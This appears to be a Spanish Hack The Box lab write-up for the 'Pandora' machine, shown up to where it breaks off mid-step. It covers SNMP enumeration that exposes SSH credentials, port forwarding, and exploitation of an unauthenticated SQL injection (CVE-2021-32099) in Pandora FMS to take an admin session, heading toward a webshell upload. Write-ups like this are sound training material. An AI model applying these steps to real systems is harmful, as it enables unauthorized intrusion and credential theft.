---
layout: single
title: Pandora - Hack The Box
excerpt: "En este post vamos a estar realizando la maquina Pandora la cual fue mi primer maquina realizada de la plataforma de Hackthebox lo cual fue hace mucho tiempo vamos a estar enumerando un puerto que encontramos abierto por el protocolo UDP gracias a eso el puerto que encontramos que corre el servicio SNMP encontraremos credenciales para conectarnos por SSH y gracias a eso encontraremos que se esta corriendo un servicio de Pandora y haremos Local port forwarding para poder ver el servicio y así aprovecharnos de una SQL injection para acceder al servicio sin proporcionar credenciales subiremos una webshell para ganar acceso y para la escalada de privilegios nos aprovecharemos de un PATH Hijacking"
date: 2023-06-21
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-pandora/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - SNMP Enumeration
  - Local Port Forwarding 
  - SQL Injection 
  - CVE-2021-32099
  - PATH Hijacking
---

⮕ Maquina Linux

```bash
❯ ping -c 1 10.10.11.136
PING 10.10.11.136 (10.10.11.136) 56(84) bytes of data.
64 bytes from 10.10.11.136: icmp_seq=1 ttl=63 time=115 ms

--- 10.10.11.136 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 115.319/115.319/115.319/0.000 ms
❯ whichSystem.py 10.10.11.136

10.10.11.136 (ttl -> 63): Linux

```

## PortScan 

```bash
❯ nmap -sCV -p22,80 10.10.11.136 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 17:44 CST
Nmap scan report for 10.10.11.136
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24c295a5c30b3ff3173c68d7af2b5338 (RSA)
|   256 b1417799469a6c5dd2982fc0329ace03 (ECDSA)
|_  256 e736433ba9478a190158b2bc89f65108 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeracion 

Estas son las tecnologías que corren el puerto **80** que corresponden a **http** 

```ruby
❯ whatweb http://10.10.11.136
http://10.10.11.136 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[contact@panda.htb,example@yourmail.com,support@panda.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.136], Open-Graph-Protocol[website], Script, Title[Play | Landing], probably WordPress, X-UA-Compatible[IE=edge]
```

Esta es la pagina **web** 

![](/assets/images/htb-writeup-pandora/web1.png)

Ya no están dando un **subdominio** al decirnos que es una extencion de **Panda.htb** 

Antes de agregarlo al **/etc/hosts** vamos a aplicar **fuzzing** para ver que no nos hemos dejado nada, pero no encontramos nada

```bash
❯ dirsearch -u http://10.10.11.136

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/10.10.11.136/_23-06-20_17-53-36.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-06-20_17-53-36.log

Target: http://10.10.11.136/

[17:53:37] Starting: 
[17:53:44] 403 -  277B  - /.ht_wsr.txt
[17:53:44] 403 -  277B  - /.htaccess.bak1
[17:53:44] 403 -  277B  - /.htaccess.orig
[17:53:44] 403 -  277B  - /.htaccess.sample
[17:53:44] 403 -  277B  - /.htaccess.save
[17:53:44] 403 -  277B  - /.htaccess_extra
[17:53:44] 403 -  277B  - /.htaccess_orig
[17:53:44] 403 -  277B  - /.htaccess_sc
[17:53:44] 403 -  277B  - /.htaccessBAK
[17:53:44] 403 -  277B  - /.htaccessOLD
[17:53:44] 403 -  277B  - /.htaccessOLD2
[17:53:44] 403 -  277B  - /.htm
[17:53:44] 403 -  277B  - /.html
[17:53:44] 403 -  277B  - /.htpasswd_test
[17:53:45] 403 -  277B  - /.htpasswds
[17:53:45] 403 -  277B  - /.httr-oauth
[17:53:47] 403 -  277B  - /.php
[17:54:16] 200 -    2KB - /assets/
[17:54:16] 301 -  313B  - /assets  ->  http://10.10.11.136/assets/
[17:54:36] 200 -   33KB - /index.html
[17:54:55] 403 -  277B  - /server-status/
[17:54:56] 403 -  277B  - /server-status

Task Completed
```

# Subdomain panda.htb 

Ahora si vamos agregar el **subdominio** al **/etc/hosts** por que no encontramos nada haciendo **fuzzing** 

```bash
❯ echo "10.10.11.136 panda.htb" | sudo tee -a /etc/hosts
10.10.11.136 panda.htb
❯ ping -c 1 panda.htb
PING panda.htb (10.10.11.136) 56(84) bytes of data.
64 bytes from panda.htb (10.10.11.136): icmp_seq=1 ttl=63 time=109 ms

--- panda.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 109.396/109.396/109.396/0.000 ms
```

Pero vemos lo mismo 

![](/assets/images/htb-writeup-pandora/web2.png)

Así que ahora ahora lo que vamos a hacer es **Fuzzing** otra vez para ahora si a nivel de **subdominio** encontramos algo

```bash
❯ dirsearch -u http://panda.htb/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/panda.htb/-_23-06-20_18-16-17.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-06-20_18-16-17.log

Target: http://panda.htb/

[18:16:18] Starting: 
[18:16:27] 403 -  274B  - /.ht_wsr.txt
[18:16:27] 403 -  274B  - /.htaccess.bak1
[18:16:27] 403 -  274B  - /.htaccess.orig
[18:16:27] 403 -  274B  - /.htaccess.sample
[18:16:27] 403 -  274B  - /.htaccess.save
[18:16:27] 403 -  274B  - /.htaccess_extra
[18:16:27] 403 -  274B  - /.htaccess_orig
[18:16:27] 403 -  274B  - /.htaccess_sc
[18:16:27] 403 -  274B  - /.htaccessBAK
[18:16:27] 403 -  274B  - /.htaccessOLD2
[18:16:27] 403 -  274B  - /.htaccessOLD
[18:16:27] 403 -  274B  - /.htm
[18:16:27] 403 -  274B  - /.html
[18:16:27] 403 -  274B  - /.htpasswd_test
[18:16:27] 403 -  274B  - /.htpasswds
[18:16:27] 403 -  274B  - /.httr-oauth
[18:16:31] 403 -  274B  - /.php
[18:17:07] 301 -  307B  - /assets  ->  http://panda.htb/assets/
[18:17:07] 200 -    2KB - /assets/
[18:17:28] 200 -   33KB - /index.html
[18:17:46] 403 -  274B  - /server-status
[18:17:46] 403 -  274B  - /server-status/

Task Completed
```

No vemos nada así que ahora vamos a hacer **Fuzzing** pero para **subdominios**, pero no encontramos nada

```bash
❯ gobuster vhost -u http://panda.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://panda.htb/
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/06/20 18:52:43 Starting gobuster in VHOST enumeration mode
===============================================================
                              
===============================================================
2023/06/20 18:53:33 Finished
===============================================================
```

Después de usar `nikto` no encontré gran cosa así que lo que podemos hacer es volver a hacer un escaneo de **Nmap** pero ahora mediante el protocolo **UDP** ya que el que siempre hacemos es **TCP** pero como no vemos nada pues podemos optar por hacerlo mediante este servicio para ver si podemos encontrar algo mas de informacion

```bash
❯ nikto -h http://panda.htb/
``` 

## PortScan UDP 

Vemos un puerto abierto

```bash
❯ nmap --open -sU --top-ports 100 -T5 -vvv -n 10.10.11.136 -oG udpPorts
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 19:04 CST
Initiating Ping Scan at 19:04
Scanning 10.10.11.136 [4 ports]
Completed Ping Scan at 19:04, 0.12s elapsed (1 total hosts)
Initiating UDP Scan at 19:04
Scanning 10.10.11.136 [100 ports]
Warning: 10.10.11.136 giving up on port because retransmission cap hit (2).
Discovered open port 161/udp on 10.10.11.136
```

Vemos que dice algo de **Linux Pandora** y la maquina se llama **Pandora**

```bash
❯ nmap -sUCV -p161 10.10.11.136 -oN UDPtargeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 19:10 CST
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.11s latency).

Bug in snmp-win32-software: no string output.
PORT    STATE SERVICE VERSION
161/udp open  snmp    net-snmp; net-snmp SNMPv3 server
| snmp-processes: 
|   1: 
|   2: 
|   3: 
|   4: 
|   6: 
|   9: 
|   10: 
|   11: 
|   12: 
|   13: 
|   14: 
|   15: 
|   16: 
|   17: 
|   18: 
|   20: 
|   21: 
|   22: 
|   23: 
|   24: 
|   25: 
|   26: 
|   27: 
|   28: 
|   29: 
|   30: 
|   77: 
|   78: 
|   79: 
|   80: 
|   81: 
|   82: 
|   83: 
|   84: 
|   85: 
|   88: 
|   89: 
|   91: 
|   92: 
|   93: 
|   94: 
|   95: 
|   96: 
|   97: 
|   98: 
|   99: 
|   100: 
|   101: 
|   102: 
|   103: 
|   104: 
|   105: 
|   106: 
|   107: 
|_  108: 
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Traffic stats: 755.52 Kb sent, 755.38 Kb received
|   VMware VMXNET3 Ethernet Controller
|     IP address: 10.10.11.136  Netmask: 255.255.254.0
|     MAC address: 005056b91f8c (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|_    Traffic stats: 67.16 Mb sent, 18.75 Mb received
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 48fa95537765c36000000000
|   snmpEngineBoots: 30
|_  snmpEngineTime: 1h28m34s
| snmp-sysdescr: Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64
|_  System uptime: 1h28m34.93s (531493 timeticks)
| snmp-netstat: 
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  10.10.11.136:55802   1.1.1.1:53
|   TCP  127.0.0.1:3306       0.0.0.0:0
|   TCP  127.0.0.53:53        0.0.0.0:0
|   UDP  0.0.0.0:161          *:*
|_  UDP  127.0.0.53:53        *:*
```

## Enumeracion UDP 

![](/assets/images/htb-writeup-pandora/web3.png)

Una herramienta para enumerar este servicio es esta `apt install snmp snmp-mibs-downloader

```bash
❯ snmpwalk -h
USAGE: snmpwalk [OPTIONS] AGENT [OID]

  Version:  5.9
  Web:      http://www.net-snmp.org/
  Email:    net-snmp-coders@lists.sourceforge.net

OPTIONS:
  -h, --help		display this help message
  -H			display configuration file directives understood
  -v 1|2c|3		specifies SNMP version to use
  -V, --version		display package version number
SNMP Version 1 or 2c specific
  -c COMMUNITY		set the community string
SNMP Version 3 specific
  -a PROTOCOL		set authentication protocol (MD5|SHA|SHA-224|SHA-256|SHA-384|SHA-512)
  -A PASSPHRASE		set authentication protocol pass phrase
  -e ENGINE-ID		set security engine ID (e.g. 800000020109840301)
  -E ENGINE-ID		set context engine ID (e.g. 800000020109840301)
  -l LEVEL		set security level (noAuthNoPriv|authNoPriv|authPriv)
  -n CONTEXT		set context name (e.g. bridge1)
  -u USER-NAME		set security name (e.g. bert)
  -x PROTOCOL		set privacy protocol (DES|AES)
  -X PASSPHRASE		set privacy protocol pass phrase
  -Z BOOTS,TIME		set destination engine boots/time
General communication options
  -r RETRIES		set the number of retries
  -t TIMEOUT		set the request timeout (in seconds)
Debugging
  -d			dump input/output packets in hexadecimal
  -D[TOKEN[,...]]	turn on debugging output for the specified TOKENs
			  (ALL gives extremely verbose debugging output)
General options
  -m MIB[:...]		load given list of MIBs (ALL loads everything)
  -M DIR[:...]		look in given list of directories for MIBs
    (default: $HOME/.snmp/mibs:/usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf)
  -P MIBOPTS		Toggle various defaults controlling MIB parsing:
			 u:  allow the use of underlines in MIB symbols
			 c:  disallow the use of "--" to terminate comments
			 d:  save the DESCRIPTIONs of the MIB objects
			 e:  disable errors when MIB symbols conflict
			 w:  enable warnings when MIB symbols conflict
			 W:  enable detailed warnings when MIB symbols conflict
			 R:  replace MIB symbols from latest module
  -O OUTOPTS		Toggle various defaults controlling output display:
			 0:  print leading 0 for single-digit hex characters
			 a:  print all strings in ascii format
			 b:  do not break OID indexes down
			 e:  print enums numerically
			 E:  escape quotes in string indices
			 f:  print full OIDs on output
			 n:  print OIDs numerically
			 p PRECISION:  display floating point values with specified PRECISION (printf format string)
			 q:  quick print for easier parsing
			 Q:  quick print with equal-signs
			 s:  print only last symbolic element of OID
			 S:  print MIB module-id plus last element
			 t:  print timeticks unparsed as numeric integers
			 T:  print human-readable text along with hex strings
			 u:  print OIDs using UCD-style prefix suppression
			 U:  don't print units
			 v:  print values only (not OID = value)
			 x:  print all strings in hex format
			 X:  extended index format
  -I INOPTS		Toggle various defaults controlling input parsing:
			 b:  do best/regex matching to find a MIB node
			 h:  don't apply DISPLAY-HINTs
			 r:  do not check values for range/type legality
			 R:  do random access to OID labels
			 u:  top-level OIDs must have '.' prefix (UCD-style)
			 s SUFFIX:  Append all textual OIDs with SUFFIX before parsing
			 S PREFIX:  Prepend all textual OIDs with PREFIX before parsing
  -L LOGOPTS		Toggle various defaults controlling logging:
			 e:           log to standard error
			 o:           log to standard output
			 n:           don't log at all
			 f file:      log to the specified file
			 s facility:  log to syslog (via the specified facility)

			 (variants)
			 [EON] pri:   log to standard error, output or /dev/null for level 'pri' and above
			 [EON] p1-p2: log to standard error, output or /dev/null for levels 'p1' to 'p2'
			 [FS] pri token:    log to file/syslog for level 'pri' and above
			 [FS] p1-p2 token:  log to file/syslog for levels 'p1' to 'p2'
  -C APPOPTS		Set various application specific behaviours:
			 p:  print the number of variables found
			 i:  include given OID in the search range
			 I:  don't include the given OID, even if no results are returned
			 c:  do not check returned OIDs are increasing
			 t:  Display wall-clock time to complete the walk
			 T:  Display wall-clock time to complete each request
			 E {OID}:  End the walk at the specified OID

```

Pero antes de usarla para enumerar este servicio necesitamos saber el **community string** la mas conocida es la **Public** así que vamos a probar

Usaremos el parámetro **v2c** que es para la versión pero lo único malo de esto es que va muy lento 

```bash
❯ snmpwalk -v2c -c public 10.10.11.136
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (689294) 1:54:52.94
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
iso.3.6.1.2.1.1.5.0 = STRING: "pandora"
iso.3.6.1.2.1.1.6.0 = STRING: "Mississippi"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (53) 0:00:00.53
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
^C
```

Vamos a usar otro herramienta que es mucho mejor y va mucha mas rápido solo que vamos a exportar toda la información a un archivo 

```bash
❯ snmpbulkwalk -c public -v2c 10.10.11.136 > snmp_enum.txt
```

Tiene muchas lineas para no ver todo y ver directamente por cosas interesantes con la anterior herramienta vimos que había un usuario que se llama **Daniel** Podemos filtrar por **Daniel**

```bash
❯ cat snmp_enum.txt | wc -l
7014
```

Y ya vemos que se esta ejecutando algo y nos comparten credenciales **daniel:HotelBabylon23**

```bash
❯ cat snmp_enum.txt | grep "Daniel" -i
iso.3.6.1.2.1.1.4.0 = STRING: "Daniel"
iso.3.6.1.2.1.25.4.2.1.5.851 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'"
iso.3.6.1.2.1.25.4.2.1.5.1117 = STRING: "-u daniel -p HotelBabylon23"
```

![](/assets/images/htb-writeup-pandora/web4.png)

## Shell as daniel 

Si probamos las credenciales por **SSH** que encontramos por **SNMP** que estaban expuestas vemos que funcionan  

```bash
❯ ssh daniel@10.10.11.136
The authenticity of host '10.10.11.136 (10.10.11.136)' can't be established.
ECDSA key fingerprint is SHA256:9urFJN3aRYRRc9S5Zc+py/w4W6hmZ+WLg6CyrY+5MDI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.136' (ECDSA) to the list of known hosts.
daniel@10.10.11.136's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 21 Jun 01:51:57 UTC 2023

  System load:           0.0
  Usage of /:            63.2% of 4.87GB
  Memory usage:          9%
  Swap usage:            0%
  Processes:             229
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.136
  IPv6 address for eth0: dead:beef::250:56ff:feb9:1f8c

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

daniel@pandora:~$ 
```

Hay otro usuario llamado **matt**  

```bash
daniel@pandora:~$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
matt:x:1000:1000:matt:/home/matt:/bin/bash
daniel:x:1001:1001::/home/daniel:/bin/bash
daniel@pandora:~$ 
```

Si o si nos tenemos que convertir en el para poder leer la **user.txt**

```bash
daniel@pandora:/home/matt$ ls -la
total 24
drwxr-xr-x 2 matt matt 4096 Dec  7  2021 .
drwxr-xr-x 4 root root 4096 Dec  7  2021 ..
lrwxrwxrwx 1 matt matt    9 Jun 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 matt matt  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 matt matt 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 matt matt  807 Feb 25  2020 .profile
-rw-r----- 1 root matt   33 Jun 20 23:42 user.txt
```

Si listamos por privilegios **SUID** vemos esto **./usr/bin/pandora_backup**

```bash
daniel@pandora:/$ find \-perm -4000 2>/dev/null
./usr/bin/sudo
./usr/bin/pkexec
./usr/bin/chfn
./usr/bin/newgrp
./usr/bin/gpasswd
./usr/bin/umount
./usr/bin/pandora_backup
./usr/bin/passwd
./usr/bin/mount
./usr/bin/su
./usr/bin/at
./usr/bin/fusermount
./usr/bin/chsh
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
daniel@pandora:/$ 
```

El grupo asignado es **matt** y el propietario es **root**

```bash
daniel@pandora:/$ ls -l ./usr/bin/pandora_backup
-rwsr-x--- 1 root matt 16816 Dec  3  2021 ./usr/bin/pandora_backup
daniel@pandora:/$ 
```

Pero bueno tenemos que convertirnos en el usuario **matt** vamos irnos a donde esta montada la **web** para ver si encontramos algo

```bash
daniel@pandora:/var/www$ ls
html  pandora
daniel@pandora:/var/www$
```

Si ingresamos al directorio vemos esto

```bash
daniel@pandora:/var/www$ cd pandora/
daniel@pandora:/var/www/pandora$ ls
index.html  pandora_console
daniel@pandora:/var/www/pandora$ cd pandora_console/
daniel@pandora:/var/www/pandora/pandora_console$ ls
AUTHORS        attachment            extras   index.php                         pandora_console_logrotate_suse    tests
COPYING        audit.log             fonts    install.done                      pandora_console_logrotate_ubuntu  tools
DB_Dockerfile  composer.json         general  mobile                            pandora_console_upgrade           vendor
DEBIAN         composer.lock         godmode  operation                         pandora_websocket_engine.service  ws.php
Dockerfile     docker_entrypoint.sh  images   pandora_console.log               pandoradb.sql
ajax.php       extensions            include  pandora_console_logrotate_centos  pandoradb_data.sql
daniel@pandora:/var/www/pandora/pandora_console$ 
```

Si corroboramos vemos que es **Apache2** y vemos un **pandora.conf** 

```bash
daniel@pandora:/var/www/pandora/pandora_console$ cd /etc/apache2/sites-enabled/
daniel@pandora:/etc/apache2/sites-enabled$ ls
000-default.conf  pandora.conf
daniel@pandora:/etc/apache2/sites-enabled$ 
```

Bueno al ver el contenido del archivo ya vemos un subdominio nuevo y lo esta corriendo el usuario **matt**

```bash
daniel@pandora:/etc/apache2/sites-enabled$ cat pandora.conf 
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
daniel@pandora:/etc/apache2/sites-enabled$ 
```

Vamos a agregarlo al **/etc/hosts** para ver si vemos algo diferente

```bash
❯ cat /etc/hosts | tail -n 1
10.10.11.136 panda.htb pandora.panda.htb
```

Pero nada vemos lo mismo

![](/assets/images/htb-writeup-pandora/web5.png)

Pero bueno se esta corriendo por el puerto **80** si hacemos un **curl** pasa esto nos redirige al servicio

```bash
daniel@pandora:/etc/apache2/sites-enabled$ curl localhost
<meta HTTP-EQUIV="REFRESH" content="0; url=/pandora_console/">
daniel@pandora:/etc/apache2/sites-enabled$ 
```

Bueno si tal lo que podemos hacer es hacer un **Local Port Forwarding** para que el puerto **80** de la maquina victima se convierta en nuestro puerto **80**

# Local Port Forwarding 

Con esto nuestro puerto **80** es el puerto **80** de la maquina ya que esta corriendo en nuestro **Local host** importante esto hay que hacerlo como **root**

```bash
❯ ssh daniel@10.10.11.136 -L 80:127.0.0.1:80
daniel@10.10.11.136's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 21 Jun 16:45:49 UTC 2023

  System load:           0.51
  Usage of /:            63.0% of 4.87GB
  Memory usage:          7%
  Swap usage:            0%
  Processes:             262
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.136
  IPv6 address for eth0: dead:beef::250:56ff:feb9:493f

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

daniel@pandora:~$ 
```

Ahora el puerto **80** de la maquina es de nosotros

```bash
❯ lsof -i:80
COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     14864 root    4u  IPv6  64090      0t0  TCP localhost:http (LISTEN)
ssh     14864 root    5u  IPv4  64091      0t0  TCP localhost:http (LISTEN)
```

Este es el contenido de lo que se esta corriendo en la maquina victima 

![](/assets/images/htb-writeup-pandora/web6.png)

Como nos están dando la versión podemos buscar si existen vulnerabilidades

![](/assets/images/htb-writeup-pandora/web7.png)

![](/assets/images/htb-writeup-pandora/web8.png)

# CVE-2021-32099 Unauthenticated SQL Injection 

Si investigamos la vulnerabilidades hay una la cual es interesante ya que no tenemos credenciales y esta vulnerabilidad es **Unauthenticated SQL Injection** <https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/>

Vamos a seguir los pasos que nos están dando de primeras no nos sale nada

![](/assets/images/htb-writeup-pandora/web9.png)

Si probamos haciendo poniendo un comilla vamos a ver que ya nos da un error de **mysql**

![](/assets/images/htb-writeup-pandora/web10.png)

Bueno basándonos en ese error vamos a proceder a hacer un ordenamiento de las columnas para saber cuantas hay y cuando desaparezca el error es por que ya sabemos las correctas

Después de estar haciendo vemos que hay 3 

![](/assets/images/htb-writeup-pandora/web11.png)

Vemos también que como tal existen muchas vulnerabilidades  

```bash
❯ searchsploit pandora
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
Pandora 7.0NG - Remote Code Execution                                                         | php/webapps/47898.py
Pandora FMS - Ping Authenticated Remote Code Execution (Metasploit)                           | linux/remote/48334.rb
Pandora Fms - Remote Code Execution (Metasploit)                                              | linux/remote/31518.rb
Pandora Fms - SQL Injection Remote Code Execution (Metasploit)                                | php/remote/35380.rb
Pandora FMS 3.1 - Authentication Bypass                                                       | php/webapps/15639.txt
Pandora FMS 3.1 - Authentication Bypass / Arbitrary File Upload (Metasploit)                  | php/remote/35731.rb
Pandora Fms 3.1 - Blind SQL Injection                                                         | php/webapps/15642.txt
Pandora Fms 3.1 - Directory Traversal / Local File Inclusion                                  | php/webapps/15643.txt
Pandora Fms 3.1 - OS Command Injection                                                        | php/webapps/15640.txt
Pandora Fms 3.1 - SQL Injection                                                               | php/webapps/15641.txt
Pandora Fms 3.2.1 - Cross-Site Request Forgery                                                | php/webapps/17524.html
Pandora FMS 3.x - 'index.php' Cross-Site Scripting                                            | php/webapps/36073.txt
Pandora FMS 4.0.1 - 'sec2' Local File Inclusion                                               | php/webapps/36792.txt
Pandora Fms 4.0.1 - Local File Inclusion                                                      | php/webapps/18494.txt
Pandora FMS 5.0/5.1 - Authentication Bypass                                                   | php/webapps/37255.txt
Pandora Fms 5.0RC1 - Remote Command Injection                                                 | php/webapps/31436.txt
Pandora FMS 5.1 SP1 - SQL Injection                                                           | php/webapps/36055.txt
Pandora FMS 7.0 NG 749 - 'CG Items' SQL Injection (Authenticated)                             | php/webapps/49046.txt
Pandora FMS 7.0 NG 749 - Multiple Persistent Cross-Site Scripting Vulnerabilities             | php/webapps/49139.txt
Pandora FMS 7.0 NG 750 - 'Network Scan' SQL Injection (Authenticated)                         | php/webapps/49312.txt
Pandora FMS 7.0NG - 'net_tools.php' Remote Code Execution                                     | php/webapps/48280.py
Pandora FMS Monitoring Application 2.1.x /3.x - SQL Injection                                 | php/webapps/10570.txt
Pandora FMS v7.0NG.742 - Remote Code Execution (RCE) (Authenticated)                          | php/webapps/50961.py
PANDORAFMS 7.0 - Authenticated Remote Code Execution                                          | php/webapps/48064.py
PandoraFMS 7.0 NG 746 - Persistent Cross-Site Scripting                                       | php/webapps/48707.txt
PandoraFMS NG747 7.0 - 'filename' Persistent Cross-Site Scripting                             | php/webapps/48700.txt
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Vemos estos 2 que ya están interesantes

![](/assets/images/htb-writeup-pandora/web12.png)

Vamos a probar este para ver que tal esta <https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated>

Nos pide un archivo  

```bash
❯ wget https://raw.githubusercontent.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/master/sqlpwn.py
--2023-06-21 11:04:06--  https://raw.githubusercontent.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/master/sqlpwn.py
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.110.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.108.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 6230 (6.1K) [text/plain]
Grabando a: «sqlpwn.py»

sqlpwn.py                       100%[=======================================================>]   6.08K  --.-KB/s    en 0.003s  

2023-06-21 11:04:06 (1.91 MB/s) - «sqlpwn.py» guardado [6230/6230]

❯ python3 sqlpwn.py
usage: sqlpwn.py [-h] -t TARGET [-f FILENAME]
sqlpwn.py: error: the following arguments are required: -t/--target

```

Si analizamos el **exploit** vemos que esta subiendo una **webshell** a una ruta lo cual esto ya es interesante ya que con esto sabemos que se pueden subir archivos pero supongo que eso es cuando ya estas dentro del panel de este servicio

![](/assets/images/htb-writeup-pandora/web13.png)

Ademas las primeras lineas del script vemos que se esta empleando una cookie del usuario administrador la cual aun no tenemos vamos a copiarnos la inyección para ver que es lo que hace 

![](/assets/images/htb-writeup-pandora/web14.png)

Como tal no pasa nada 

Hay vemos la **query** 

![](/assets/images/htb-writeup-pandora/web15.png)

Pero bueno hay que recordar que con esta **query** le estamos robando la **cookie** al usuario **administrador** así que si esto funciono solo quitamos toda la **query** que metimos y listo estamos logueados (quitamos la query una vez inyectada de tal modo que la **url** quedaría así **localhost:80/pandora_console/ )

![](/assets/images/htb-writeup-pandora/web16.png)

Bueno ahora que estamos logueados hay que recordar que en el script esta subiendo una **webshell** para ganar acceso así que tenemos que ver donde es donde esta subiendo la **webshell**

Si nos vamos a **Admin tools** vemos que hay una parte llamada **File Manager**

![](/assets/images/htb-writeup-pandora/web17.png)

Vamos a crear un nuevo directorio 

![](/assets/images/htb-writeup-pandora/web18.png)

Una vez le damos el nombre que queremos y le damos en el botón de crear vemos que funciona 

![](/assets/images/htb-writeup-pandora/web19.png)

En el script también vemos que hay una ruta donde básicamente se esta subiendo todo 

![](/assets/images/htb-writeup-pandora/web20.png)

Si le damos click en la carpeta que creamos en la interfaz gráfica de pandora donde estábamos

